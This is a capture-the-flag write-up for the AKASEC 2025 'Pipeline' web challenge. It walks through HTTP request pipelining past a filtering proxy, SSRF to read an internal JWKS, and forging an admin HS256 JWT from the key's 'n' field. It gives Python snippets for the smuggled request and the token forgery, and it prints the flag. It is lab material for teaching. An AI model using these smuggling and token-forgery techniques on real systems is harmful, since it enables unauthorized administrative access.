---
title: "Pipeline"
slug: akasec-2025-pipeline
excerpt: "HTTP Request Pipelining to smuggle requests, extract JWKS, forge admin JWT"
coverImage: "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800"
coverImageAlt: "Pipeline - AKASEC 2025 CTF writeup"
categories:
  - AKASEC 2025
  - Web
  - HTTP Smuggling
  - JWT
date: 2025-01-20
showToc: true
---

## Challenge Overview

The challenge presents a Node.js application with three main components:

1. A reverse proxy that filters dangerous requests
2. A main application with protected endpoints
3. An internal JWKS server

The goal is to obtain a flag from `/admin/flag`, which requires admin authentication.

## Architecture

```
┌─────────────────┐
│   Port 8082     │
│  Reverse Proxy  │  ← External access
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│   Port 3000     │
│  Main App       │  ← Internal only
│  - /admin/flag  │
│  - /debug/fetch │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│   Port 5000     │
│  JWKS Server    │  ← Localhost only
└─────────────────┘
```

## Vulnerabilities Identified

### 1. HTTP Request Pipelining

The proxy's `parseHeaders()` function only parses the first request but forwards the **entire buffer** to the backend. We can smuggle requests!

### 2. JWT Algorithm Confusion

The app accepts both RS256 (asymmetric) and HS256 (symmetric). The HMAC secret is the `n` field from JWKS:

```javascript
const hmacSecret = (data.keys[0].n || '').toString();
```

### 3. SSRF via /debug/fetch

Can read internal services like the JWKS server on port 5000.

## Exploitation Chain

### Step 1: Bypass Proxy with HTTP Pipelining

```python
# First request: Harmless, passes proxy check
request1 = "GET / HTTP/1.1\r\nHost: app\r\n\r\n"

# Second request: Smuggled /debug request
request2 = "GET /debug/fetch?url=http://localhost:5000/.well-known/jwks.json HTTP/1.1\r\nHost: app\r\nX-Forwarded-For: 127.0.0.1\r\n\r\n"

# Send both in one packet
sock.sendall((request1 + request2).encode())
```

### Step 2: Extract JWKS via SSRF

The smuggled request fetches the JWKS, revealing the HMAC secret in the `n` field.

### Step 3: Forge Admin JWT

```python
import jwt
payload = {'role': 'admin', 'user': 'attacker'}
token = jwt.encode(payload, 'secret-from-jwks-n-field', algorithm='HS256')
```

### Step 4: Retrieve the Flag

Pipeline another request with the forged JWT to `/admin/flag`.

## Flag

```
AKASEC{MzAha_MN_Qb1lA_9ad_H4d_xi}
```

## Summary

1. The proxy only validates the FIRST request in a pipelined sequence
2. But it forwards ALL requests to the backend
3. Extract HMAC secret from JWKS endpoint via SSRF
4. Forge HS256 JWT with role=admin
5. Pipeline again with forged JWT to get the flag!
